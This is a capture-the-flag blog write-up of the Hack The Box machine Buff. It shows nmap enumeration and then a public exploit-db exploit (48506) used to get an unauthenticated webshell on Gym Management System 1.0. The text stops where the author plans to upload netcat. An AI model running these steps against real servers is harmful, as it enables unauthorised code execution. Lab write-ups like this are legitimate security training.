---
layout: single
title: "Hack The Box Write-up #6 : Buff"
excerpt: "Writeup for Buff, a windows machine provided by HacktheBox."
date: 2020-11-22
toc: true
toc_sticky: true
header:
  tagline: "Writeup for Tabby , a machine provided by HacktheBox."
  overlay_image: /assets/images/background.jpg
  overlay_filter: 0.5
  actions:
    - label: "Learn More"
      url: "https://www.hackthebox.eu/home/machines/profile/263"
  teaser: /assets/images/buff-writeup/buff.png
  teaser_home_page: true
  
categories:
  - hackthebox
tags:  
  - windows
  - cve
  - rce
  - buffer-overflow
  - CloudMe
---


## Summary
Buff is an easy Windows machine provided by egotisticalSW on hackthebox. We are provided with a vulnerable **Gym Management System** for the initial Foothold where we use a RCE vulnerability to gain a low-privileged shell. For root We exploit a target (**CloudMe**) which is vulnerable to Buffer Overflow.

## Enumeration
Using our very first usual information , which is the machine's IP , we begin to enumerate with a **nmap** scan

### nmap

```sh
root@kali:~# nmap -sC -sV -T4 10.10.10.198
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 15:46 CET
Nmap scan report for 10.10.10.198
Host is up (0.078s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
```
Only one port open , **8080** which appears to be a WebServer holding the title : **mrb3n's Bro Hut**.

### Webpage

The webpage represents somewhat of a fitness page with a login option.

![webpage](githuburl)

Clicking on **Contact** button reveals useful information.
The website has been built using **Gym Management Software 1.0** :

![contact](githuburl)

While searching the software on **exploitdb** We find a RCE vulnerability ...

![webpage](githuburl)

I am going to use the 4th exploit which appears to be an **Unauthenticated Remote Code Execution** Vulnerability.

```sh
root@kali:~# searchsploit -m /usr/share/exploitdb/exploits/php/webapps48506.py
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/48506.py


root@kali:~# python 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```

I have gained an initial shell which is somewhat unstable and not very helpful for lateral movement so I'm going to upload netcat and grab myself a stable shell.
